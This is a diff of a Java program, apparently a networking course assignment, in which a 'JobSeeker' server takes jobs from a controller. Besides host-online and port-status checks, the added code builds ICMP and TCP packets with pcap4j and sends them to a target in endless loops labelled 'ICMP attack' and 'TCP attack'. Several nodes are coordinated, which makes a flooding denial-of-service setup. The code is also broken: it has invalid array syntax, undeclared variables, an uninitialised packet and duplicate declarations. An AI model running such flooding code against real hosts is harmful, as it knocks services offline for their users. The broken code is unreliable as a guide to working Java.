@@ -1,16 +1,43 @@
+import org.pcap4j.core.*;
+import org.pcap4j.packet.*;
+import org.pcap4j.packet.namednumber.*;
+import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.*;
 import java.io.*;
 //job seeker waits for jobSeeker to connect, accepts job request, does job, reports back
-public class A3JobSeeker{ //server
-    public static void main(String[] args) throws IOException{
+public class A3JobSeeker { //server
+    public static void main(String[] args) throws IOException {
         String jobString;
         String jobIp;
         String jobPort;
         boolean badJob = false;
         boolean jobDone = false;
-        ServerSocket ss = new ServerSocket(4999);
-        Socket s;
+        //code to incorporate pcap4j packet building
+        IcmpV4EchoPacket.Builder echoBuilder = new IcmpV4EchoPacket.Builder();
+        echoBuilder
+                .identifier((short) 1);
+
+        IcmpV4CommonPacket.Builder icmpV4Builder = new IcmpV4CommonPacket.Builder();
+        icmpV4Builder
+                .type(IcmpV4Type.ECHO)
+                .code(IcmpV4Code.NO_CODE)
+                .payloadBuilder(echoBuilder)
+                .correctChecksumAtBuild(true);
+        //code for connection
+        int[] servers[ 3] ={
+            4999, 4998, 4997
+        } ;//allows 3 different sockets for 3 different JobSeekers
+        int i = 0;
+        //start connection
+        Socket s = new Socket();
+        //loop for multiple JobSeekers
+        while (i < 3) {
             try {
+                ServerSocket ss = new ServerSocket(servers[i]);
                 s = ss.accept();
                 //server can only connect to one client at a time
                 System.out.println("JobCreator connected. Waiting for Job...");
@@ -23,7 +50,6 @@ public class A3JobSeeker{ //server
                 //get IP address from JobCreator
                 jobIp = bf.readLine();
                 System.out.println("IP: " + jobIp);
-
                 //get port number from JobCreator
                 jobPort = bf.readLine();
                 System.out.println("Port: " + jobPort);
@@ -51,6 +77,23 @@ public class A3JobSeeker{ //server
                         pr.println(0);
                         pr.flush();
                     } else {
+                        //prep pcap4j for packet building
+                        IpV4Packet.Builder ipv4Builder = new IpV4Packet.Builder();
+                        try {
+                            ipv4Builder
+                                    .version(IpVersion.IPV4)
+                                    .tos(IpV4Rfc791Tos.newInstance((byte) 0))
+                                    .ttl((byte) 100)
+                                    .protocol(IpNumber.ICMPV4)
+                                    //servers IP and target IP
+                                    .srcAddr((Inet4Address) InetAddress.getLocalHost())
+                                    .dstAddr((Inet4Address) InetAddress.getByName(targetIP))
+                                    .payloadBuilder(icmpV4Builder)
+                                    .correctChecksumAtBuild(true)
+                                    .correctLengthAtBuild(true);
+                        } catch (UnknownHostException e) {
+                            e.printStackTrace();
+                        }
                         //do the job based on job type
                         //assign part of create-assign-execute-report process for each job
                         switch (jobString) {
@@ -71,15 +114,15 @@ public class A3JobSeeker{ //server
                                 //detect status of port jobPort at IP address jobIP
                                 String pstat = portStatus(jobIp, jobPort);
                                 //report part of create-assign-execute-report process for A3P2Q1 Job 2
-                                if(pstat.equalsIgnoreCase("open")){
+                                if (pstat.equalsIgnoreCase("open")) {
                                     System.out.println("Port Open");
                                     pr.println("Port " + jobPort + " at IP address " + jobIp + " is open.");
                                     pr.flush();
-                                } else if (pstat.equalsIgnoreCase("closed")){
+                                } else if (pstat.equalsIgnoreCase("closed")) {
                                     System.out.println("Port Closed");
                                     pr.println("Port " + jobPort + " at IP address " + jobIp + " is closed.");
                                     pr.flush();
-                                } else if(pstat.equalsIgnoreCase("filtered")){
+                                } else if (pstat.equalsIgnoreCase("filtered")) {
                                     System.out.println("Port Filtered");
                                     pr.println("Port " + jobPort + " at IP address " + jobIp + " is filtered.");
                                     pr.flush();
@@ -90,12 +133,59 @@ public class A3JobSeeker{ //server
                                 }
                                 break;
                             case "3":
-                                //assign 3rd job to JobSeeker, Q2 Job 2
-                                thirdJob(jobIp, jobPort);
+                                //assign 3rd job to JobSeeker, Q2 Job 1
+                                //execute part of create-assign-execute-report process for A3P2Q2 Job 1
+                                InetAddress localHost = InetAddress.getLocalHost();
+                                Packet p = ipv4Builder.build();
+                                //create handle
+                                PcapNetworkInterface nif = Pcaps.getDevByAddress(localHost);
+                                int snapLen = 65536;
+                                PromiscuousMode mode = PromiscuousMode.PROMISCUOUS;
+                                int timeout = 10;
+                                PcapHandle handle = nif.openLive(snapLen, mode, timeout);
+                                try {
+                                    handle.sendPacket(p);
+                                } catch (PcapNativeException | NotOpenException e) {
+                                    e.printStackTrace();
+                                }
+                                //if successful, continuously send the packet for ICMP attack
+                                while (true) {
+                                    try {
+                                        handle.sendPacket(p);
+                                    } catch (PcapNativeException | NotOpenException e) {
+                                        e.printStackTrace();
+                                    }
+                                }
                                 break;
                             case "4":
-                                //assign 4th job to JobSeeker, Q2 Job 3
-                                fourthJob(jobIp, jobPort);
+                                //assign 4th job to JobSeeker, Q2 Job 2
+                                //execute part of create-assign-execute-report process for A3P2Q2 Job 2
+                                InetAddress localHost = InetAddress.getLocalHost();
+                                //create tcp packet
+                                Packet tcpp;
+                                tcpp.getBuilder().get(TcpPacket.Builder.class).srcAddr(tcpp.get(IpV4Packet.class).getHeader().getSrcAddr());
+                                tcpp.getBuilder().get(TcpPacket.Builder.class).dstAddr(tcpp.get(IpV4Packet.class).getHeader().getDstAddr());
+                                tcpp.getBuilder().get(TcpPacket.Builder.class).correctChecksumAtBuild(true);
+                                tcpp.getBuilder().build();
+                                //create handle
+                                PcapNetworkInterface nif = Pcaps.getDevByAddress(localHost);
+                                int snapLen = 65530;
+                                PromiscuousMode mode = PromiscuousMode.PROMISCUOUS;
+                                int timeout = 20;
+                                PcapHandle handle = nif.openLive(snapLen, mode, timeout);
+                                try {
+                                    handle.sendPacket(tcpp);
+                                } catch (PcapNativeException | NotOpenException e) {
+                                    e.printStackTrace();
+                                }
+                                //if successful, continuously send the packet for TCP attack
+                                while (true) {
+                                    try {
+                                        handle.sendPacket(tcpp);
+                                    } catch (PcapNativeException | NotOpenException e) {
+                                        e.printStackTrace();
+                                    }
+                                }
                                 break;
                             default:
                                 pr.println("Error. Job not assigned.");
@@ -113,15 +203,26 @@ public class A3JobSeeker{ //server
                 }
                 //end socket for this job.
                 s.close();
-            } catch(IOException ioe){
+            } catch (IOException ioe) {
                 System.out.println("Error. JobCreator disconnected.");
             }
+            //if job type is 1 or 2, there is only 1 JobSeeker, so exit while loop
+            if (jobType.equalsIgnoreCase("1") || jobType.equalsIgnoreCase("2")) {
+                i = 3;
+            }
+            //otherwise go to next JobSeeker for job types 3 and 4
+            else {
+                i++;
+            }
+        }
     }
+
     //job 1 = check if given IP address is online or not
     //execute part of create-assign-execute-report process for A3P2Q1 Job 1
     public static boolean isOnline(String jobIp) throws IOException {
         return InetAddress.getByName(jobIp).isReachable(5000);
     }
+
     //job 2 = check status of given port number at given IP address
     //execute part of create-assign-execute-report process for A3P2Q1 Job 2
     public static String portStatus(String jobIp, String jobPort) {
@@ -132,11 +233,11 @@ public class A3JobSeeker{ //server
             //connection to port at host established, new socket
             sckt = new Socket(jobIp, port);
         } catch (IOException e) {
-            if(e.getMessage().equals("Connection refused")){
+            if (e.getMessage().equals("Connection refused")) {
                 //returns port status as closed
                 status = "closed";
             }
-            if(e instanceof SocketTimeoutException){
+            if (e instanceof SocketTimeoutException) {
                 //connection timed out, port blocked by firewall
                 //returns port status as filtered
                 status = "filtered";
@@ -145,7 +246,7 @@ public class A3JobSeeker{ //server
             //checks if port is not filtered
             if (sckt != null) {
                 //returns port status as open
-                if (sckt.isConnected()){
+                if (sckt.isConnected()) {
                     status = "open";
                 }
                 try {
@@ -157,15 +258,5 @@ public class A3JobSeeker{ //server
             }
         }
         return status;
-    }
-    //job 3 = code to do third job
-    //execute part of create-assign-execute-report process for A3P2Q2 Job 2
-    public static void thirdJob(String jobIp, String jobPort) {
-        
-    }
-    //job 4 = code to do fourth job
-    //execute part of create-assign-execute-report process for A3P2Q2 Job 3
-    public static void fourthJob(String jobIp, String jobPort) {
-        
     }
 }
